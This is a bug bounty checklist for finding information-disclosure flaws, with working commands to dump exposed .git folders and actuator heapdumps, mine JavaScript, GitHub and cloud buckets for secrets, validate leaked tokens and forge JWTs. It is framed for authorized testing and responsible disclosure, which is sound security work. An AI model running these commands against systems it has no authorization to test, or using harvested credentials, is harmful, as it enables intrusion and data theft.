# Information Disclosure With Impact — Bug Bounty Hunting Checklist

> **Impact-first mindset:** Triagers reward *consequence*, not novelty. A version banner, a directory listing with nothing confidential, or a generic stack trace is usually **informative / out of scope**. To earn a payout you must show a leaked **valid credential**, **PII access**, an **auth bypass**, or a **source→further-bug** escalation. Every finding in this checklist ends with "…so what can an attacker *do* with it?"

> **Scope & conduct reminder:** Only test in-scope assets you're authorized for. Validate leaked secrets in the **least-intrusive way the program allows** — confirm a credential is *valid/privileged*, then stop. Never enumerate other users' data, never overwrite/delete, never exfiltrate beyond the single record needed for PoC. Leaked-credential reports are sensitive: no extortion, no public disclosure before fix. (OWASP Vulnerability Disclosure Cheat Sheet.)

---

## The Impact Test (apply to EVERY leak before reporting)

| Leak | Informative (likely rejected) | Impactful (report) |
| --- | --- | --- |
| Version / banner | Version alone | Version **+ working CVE PoC** |
| Directory listing | Empty / no secrets | **Confidential file** retrievable from it |
| HTML comments | Dev notes | **Credential / hidden privileged path** inside |
| Stack trace / error | Generic 500 | **Table/column names, file paths, creds, internal IPs** that enable a follow-up attack |
| `.git` / source | "It's exposed" | **Dumped source → hardcoded creds / new endpoints / IDOR / RCE** |
| API response | Extra field | **Other users' PII / password / token** |
| Cloud bucket | "Bucket exists" | **Publicly readable + sensitive files** (invoices, backups, `.env`) |
| JS key | "A key is in JS" | **Key is privileged & actively mints tokens / accesses data** |

> Rule of thumb: *disclosure of technical info matters only if you demonstrate the harmful action it enables.*

---

## Phase 1 — Recon: Map Where Leaks Could Live

### 1.1 Subdomains → live hosts → tech (CLI pipeline)
```bash
subfinder -d target.com -all -recursive -silent \
  | httpx -silent -sc -title -tech-detect -o alive.txt
# Tech-detect tells you which leak files matter (.env for PHP/Laravel, /actuator for Spring, etc.)
```

### 1.2 Historical URLs (since-removed leaks still served / cached)
```bash
echo target.com | gau --subs > urls.txt
echo target.com | waybackurls >> urls.txt
cat urls.txt | uro | sort -u > urls_clean.txt
# Grep for juicy extensions/paths (see §2 + Appendix A)
grep -aiE '\.(env|bak|old|sql|zip|tar\.gz|swp|log|json|yml|config)(\?|$)|/\.git|/actuator|/debug|phpinfo' urls_clean.txt
```

---

## Phase 2 — Server-Side Force-Browsing (config / backup / debug)

### 2.1 Probe high-value files (403 or 200/301 = present; 404 = absent)
```bash
ffuf -w juicy-paths.txt:FUZZ -u https://target.com/FUZZ \
  -mc 200,301,302,403 -ac -o ff.json
```
Priority targets (Appendix A has the full list):
```
.env  .env.local  .env.bak   config.php  wp-config.php  settings.py
application.properties  application.yml  web.config  .htpasswd
*.bak *.old *.swp *.sql *.sql.gz backup.zip db.sql  .DS_Store
phpinfo.php  /server-status  /debug  /trace
/actuator  /actuator/env  /actuator/heapdump  /actuator/configprops  /actuator/mappings
```

### 2.2 Spring Boot Actuator (frequent high-impact)
```bash
curl -s https://target.com/actuator | jq .            # enumerate exposed endpoints
curl -s https://target.com/actuator/env | grep -iE 'password|secret|key|token'
curl -s https://target.com/actuator/heapdump -o heap.bin   # then strings/grep for creds
strings heap.bin | grep -iE 'password=|secret=|AKIA|bearer '
```
> `/actuator/heapdump` → in-memory credentials/session tokens = High–Critical. Prove with one extracted secret; don't dump the whole heap to a third party.

### 2.3 Verbose errors → targeted follow-up
- Trigger a 500 (bad type, array param, huge value, malformed JSON, single quote).
- **SQL error** → harvest table/column names → feeds targeted SQLi (cite that as the impact).
- **Stack trace** → framework version, absolute file paths (feed LFI), internal hostnames/IPs (feed SSRF), sometimes creds in connection strings.
- **`.DS_Store`** → parse to reveal hidden filenames → force-browse those.

### 2.4 `robots.txt` / sitemap / source comments
- Read disallowed paths (often admin/debug) — *only impactful if those paths then expose something*.
- View-source + JS for `<!-- creds/TODO -->`, internal URLs, API keys.

---

## Phase 3 — Source / VCS Exposure (high impact)

### 3.1 Detect (per host, across all subdomains)
```bash
# 403 (listing off) OR 200 = likely present; 404 = absent
for h in $(cat alive.txt); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$h/.git/HEAD")
  [ "$code" = 200 -o "$code" = 403 ] && echo "[git?] $h ($code)"
done
# Confirm with real object paths:
#  /.git/HEAD  /.git/config  /.git/index  /.git/logs/HEAD
```
Other VCS / metadata (probe the same way):
```
/.svn/   /.svn/wc.db   /.hg/   /.bzr/   /_darcs/   /Bitkeeper/   /.git/HEAD
```

### 3.2 Dump
```bash
# Git — handles dir-listing-disabled
git-dumper https://target.com/.git/ ./dump
# or GitTools
./gitdumper.sh https://target.com/.git/ ./dump && cd dump && git checkout -- .

# Other VCS
svn-extractor --url https://target.com/.svn/      # .svn
hg-dumper https://target.com/.hg/ ./hg            # .hg
bzr_dumper ...                                     # .bzr
```

### 3.3 Recover a partial dump
```bash
git fsck                       # list broken/missing objects
git checkout -- .              # restore working tree
```

### 3.4 Mine the dump for impact (this is where the bug becomes a bounty)
```bash
git log --oneline
git log -p | grep -iE 'password|passwd|secret|api[_-]?key|token|AKIA|AIza|begin rsa'
# Removed-but-historical secrets:
gitleaks detect --source ./dump --log-opts="--all" -v
trufflehog git file://./dump --only-verified
```
Then read the source for: hardcoded creds, new/hidden endpoints, IDOR patterns, deserialization/RCE sinks, and **dev/staging hostnames that may be equally exposed**.

---

## Phase 4 — JavaScript: Endpoints, Routes & Secrets

### 4.1 Collect JS at scale
```bash
katana -list alive.txt -jc -jsl -silent | grep -iE '\.js(\?|$)' | sort -u > js.txt
# fallback crawler
gospider -S alive.txt -c 10 --other-source | grep -oE 'https?://[^ ]+\.js' >> js.txt
```

### 4.2 Extract endpoints / hidden routes
```bash
cat js.txt | while read u; do python3 linkfinder.py -i "$u" -o cli; done | sort -u
# Hidden admin panels, internal APIs, undocumented params -> feed to the rest of your testing
```

### 4.3 Hunt secrets (keyword + entropy — minified JS hides base64 secrets)
```bash
cat js.txt | while read u; do python3 SecretFinder.py -i "$u" -o cli; done >> secrets.txt
nuclei -l js.txt -t http/exposures/ -o js_exposures.txt
# Entropy pass for obfuscated/base64 blobs keyword grep misses:
cat *.js | grep -oE '[A-Za-z0-9+/]{32,}={0,2}' | while read s; do
  echo "$s $(echo -n "$s" | ent 2>/dev/null | awk '/Entropy/{print $3}')"; done | sort -k2 -n
```

### 4.4 Prove the key is *actually privileged* (the difference between P5 and a payout)
- Cross-check against **KeyHacks** for the exact validation call per provider.
- A frontend OAuth `client_secret` / API key may be **intentionally public** — confirm it grants privileged action:
  - OAuth `client_secret` → exchange for a token (`grant_type=client_credentials`) → show it mints a **valid access token** acting as the client.
  - Maps/analytics keys are often public-by-design → usually informative unless billable/abusable.

---

## Phase 5 — External / GitHub & Archive Secret Hunting

### 5.1 GitHub Code Search dorks (org + employee personal repos)
```
org:"Target" filename:.env
org:"Target" (AWS_ACCESS_KEY_ID OR aws_secret_access_key)
org:"Target" ("sk_live_" OR "pk_live_")        # Stripe
org:"Target" /sk-[a-zA-Z0-9]{20,}/             # OpenAI
org:"Target" ("mongodb://" OR "postgres://" OR "mysql://")
org:"Target" (extension:pem OR extension:key)
"Target.com" "Authorization: Bearer"
filename:vim_settings.xml "Target"             # IntelliJ base64 copy-paste history
```
- **Commit history is gold:** secrets removed from HEAD persist in history. Search `type:Commits`, and mine the *copy-paste history* in `vim_settings.xml` (base64-decode).

### 5.2 Automated org/repo scanning with verification
```bash
trufflehog github --org=Target --only-verified          # 700+ detectors, live-verified
gitleaks detect --source . --log-opts="--all"           # full history
echo "target.com" | git-hound --dig-files --dig-commits # code-search + commit dig
```

### 5.3 Archives — since-removed secrets
- **Wayback / CommonCrawl** snapshots of old JS/config where a secret was briefly committed then pulled.
- GitHub indexes deleted-but-cached blobs; check cached commit URLs.

### 5.4 Token prefixes to recognize anywhere (JS, repos, buckets)
```
AKIA…(AWS)  AIza…(Google)  ghp_/gho_/ghs_(GitHub)  sk_live_/pk_live_(Stripe)
xoxb-/xoxp-(Slack)  ya29.(Google OAuth)  eyJ…(JWT)  -----BEGIN … PRIVATE KEY-----
```

---

## Phase 6 — Cloud Storage Buckets

### 6.1 Find & test public read
```bash
# Bucket names from JS, HTML, DNS (CNAME to s3), 403/redirect responses
aws s3 ls s3://target-assets --no-sign-request          # anonymous list
curl -s https://target-assets.s3.amazonaws.com/         # XML listing if public
# GCS / Azure equivalents
curl -s https://storage.googleapis.com/target-bucket/
curl -s https://target.blob.core.windows.net/container?restype=container&comp=list
```

### 6.2 Prove impact (non-intrusive)
- Show the bucket is **publicly readable AND holds sensitive files** (invoices, DB backups, `.env`, PII exports) — list + fetch **one** benign-but-clearly-sensitive object as PoC.
- Scan bucket for secrets with verification:
```bash
trufflehog s3 --bucket=target-bucket --only-verified
```
- Test **write** only if policy allows and non-destructively (upload a uniquely-named harmless file; never overwrite).

---

## Phase 7 — Scale & Escalate (turn one leak into many / into takeover)

### 7.1 Replay the leaky endpoint across EVERY subdomain
> Real $4k tip: a single disclosing path (e.g. `/api/config`, `/debug`, an exposed export) often exists on dozens of hosts. Don't report just one.
```bash
cat alive.txt | sed 's#$#/the-leaky-path#' \
  | httpx -silent -mc 200,301,403 -o affected_hosts.txt
```

### 7.2 Disclosure → impact escalation map
```
leaked DB/API creds  -> validate non-intrusively (identity call) -> data access / ATO
exposed .git/.svn    -> dump -> source review -> new endpoints, IDOR, hardcoded creds, RCE
public bucket        -> list/read -> PII (invoices, backups) + more secrets
/actuator/heapdump   -> strings -> in-memory tokens/creds -> session hijack
verbose SQL error    -> table/column names -> targeted SQLi
JS clientSecret/JWT  -> mint token / forge JWT (weak secret) -> auth bypass / impersonation
```

### 7.3 Weak-secret JWT (when a signing secret leaks)
```bash
# Confirm the leaked secret actually signs the app's tokens
hashcat -m 16500 jwt.txt <(echo "$LEAKED_SECRET")   # verify, then forge an admin token as PoC
```

---

## Phase 8 — Non-Intrusive Validation Recipes (prove, don't pillage)

```bash
# AWS key -> identity only (no resource enumeration)
AWS_ACCESS_KEY_ID=… AWS_SECRET_ACCESS_KEY=… aws sts get-caller-identity

# Google API key -> single cheap call documented as public-vs-privileged check
# Stripe -> /v1/balance with the key (read-only, your-account scope)
curl https://api.stripe.com/v1/balance -u "sk_live_…:"

# Slack token
curl -s "https://slack.com/api/auth.test" -H "Authorization: Bearer xoxb-…"

# GitHub PAT -> whoami + scopes (header shows X-OAuth-Scopes)
curl -sI -H "Authorization: token ghp_…" https://api.github.com/user

# Generic SaaS -> trufflehog already verified it; cite verified=true
```
> Capture the *identity/scope* response as PoC. Do **not** list buckets, read mail, or query customer data beyond the minimum.

---

## Phase 9 — Reporting

### Severity Matrix
| Finding | Severity |
| --- | --- |
| Verbose error / version (no follow-up shown) | Informative (don't submit alone) |
| Stack trace exposing internal paths/IPs usable in another bug | Low–Medium |
| Directory listing **with** a confidential file | Medium |
| Source via `.git`/VCS (no secrets yet) | Medium |
| `.git`/source → hardcoded creds / new exploitable endpoints | High |
| Valid leaked credential (verified) — API/DB/cloud | High–Critical |
| `/actuator/heapdump` or `.env` with live secrets | High–Critical |
| Public bucket with PII / backups | High |
| JS secret → minted token / auth bypass / ATO | High–Critical |
| Same leak across many subdomains | Aggregate impact bump |

### Pre-Submission Checklist
- [ ] Stated the **consequence**, not just the leak ("…enables X")
- [ ] Credential validated the least-intrusive way; identity/scope screenshot included
- [ ] No access to other users' data beyond a single PoC record
- [ ] Did not overwrite/delete anything; bucket-write tested only if allowed
- [ ] Listed all affected hosts/subdomains
- [ ] Redacted secrets appropriately in the report; followed responsible-disclosure conduct

### Minimal PoC Template
```
Asset:        https://api.target.com/.git/  (also present on 7 subdomains — see list)
Leak:         Exposed .git → full source dumped (git-dumper)
Evidence:     git log -p revealed DB_PASSWORD + an AWS key (AKIA…) in commit a1b2c3
Validation:   aws sts get-caller-identity → arn:aws:iam::123…:user/prod-app (valid, privileged)
Impact:       Unauthenticated source disclosure leaking live production credentials →
              database + AWS account access. (Validated identity only; no data accessed.)
Remediation:  Block /.git, rotate the exposed credentials.
```

---

## Appendix A — Juicy Paths to Force-Browse
```
# Config / secrets
.env .env.local .env.dev .env.bak  config.php config.json config.yml
wp-config.php  settings.py  application.properties  application.yml
web.config  .htpasswd  .htaccess  credentials  secrets.json

# Backups / dumps / source
*.bak *.old *.orig *.save *.swp *.swo  *.sql *.sql.gz *.dump  db.sql
backup.zip backup.tar.gz  site.zip  www.zip  source.zip  .DS_Store

# Debug / info / mgmt
phpinfo.php  info.php  test.php  /server-status  /server-info
/debug  /trace  /metrics  /__debug__
/actuator  /actuator/env  /actuator/heapdump  /actuator/configprops
/actuator/mappings  /actuator/threaddump  /actuator/loggers

# VCS / metadata
/.git/HEAD /.git/config /.git/index /.git/logs/HEAD
/.svn/wc.db  /.hg/  /.bzr/  /_darcs/
```

## Appendix B — Secret Keywords / Regex (JS & response grep)
```
secret api_key apikey access_key client_secret auth_token bearer
password passwd private_key refresh_token x-api-key db_password
AKIA AIza ghp_ gho_ ghs_ sk_live_ pk_live_ xoxb- ya29. eyJ
mongodb:// postgres:// mysql:// redis:// firebase
-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----
```

## Appendix C — Tool Stack Reference
| Tool | Purpose | Install / Source |
| --- | --- | --- |
| `git-dumper` | One-shot remote `.git` dump | `pip install git-dumper` |
| GitTools | Dumper/Extractor/Finder for `.git` | https://github.com/internetwache/GitTools |
| `svn-extractor` / `hg-dumper` | `.svn` / `.hg` dumping | github anantshri / arthaud |
| `trufflehog` | 700+ detectors w/ **live verification** (git, GitHub, S3, GCS, FS) | `https://github.com/trufflesecurity/trufflehog` |
| `gitleaks` | Fast git-history secret scan | `https://github.com/gitleaks/gitleaks` |
| `git-hound` | GitHub code-search + commit dig | `https://github.com/tillson/git-hound` |
| LinkFinder | Endpoints from JS | `https://github.com/GerbenJavado/LinkFinder` |
| SecretFinder | Secrets/keys from JS | `https://github.com/m4ll0k/SecretFinder` |
| `katana` | JS-aware crawler (`-jc -jsl`) | `go install .../katana/cmd/katana@latest` |
| `gau` / `waybackurls` | Historical/archived URLs | tomnomnom / lc |
| KeyHacks | Per-provider key validation calls | `https://github.com/streaak/keyhacks` |
| `httpx` / `ffuf` / `nuclei` | Probe / force-browse / templated exposure checks | ProjectDiscovery / ffuf |

## Appendix D — At-Scale Recon One-Liner
```bash
subfinder -d target.com -all -silent \
 | httpx -silent -mc 200 \
 | katana -jc -jsl -silent | grep -iE '\.js(\?|$)' | sort -u \
 | tee js.txt | xargs -I@ python3 SecretFinder.py -i @ -o cli >> secrets.txt
```

---

## References
- PortSwigger Information Disclosure: https://portswigger.net/web-security/information-disclosure
- Intigriti — Exploiting Information Disclosure (triage/impact): https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-information-disclosure-vulnerabilities
- Intigriti — Hunting for Secrets: https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-secrets-in-bug-bounty-targets
- Intigriti — Testing JavaScript Files: https://www.intigriti.com/researchers/blog/hacking-tools/testing-javascript-files-for-bug-bounty-hunters
- PentesterLand — Source disclosure via exposed .git: https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/
- Exposed Source Code (multi-VCS) cheat sheet: https://github.com/trilokdhaked/Bug-Bounty-Methodology/blob/main/Exposed%20Source%20Code.md
- TruffleHog (verification) + S3 scanning: https://github.com/trufflesecurity/trufflehog | https://trufflesecurity.com/blog/how-to-scan-s3-buckets-for-secrets
- tillsongalloway — $15k from GitHub secret leaks: https://tillsongalloway.com/finding-sensitive-information-on-github/index.html
- "$4000 from a simple information disclosure" (replay across subdomains): https://medium.com/@rajauzairabdullah/how-i-earned-4000-from-a-simple-information-disclosure-bug-d644c47803c1
- Exposed client_secret in JS → mint tokens: https://infosecwriteups.com/exposed-client-secret-in-javascript-resulted-in-quick-bug-bounty-35a609be138d
- OWASP Vulnerability Disclosure Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html
- Full article reference library: [[1-Refreces/ARTICLES/ATTACK/INFORMATION-DISCLOSURE]]
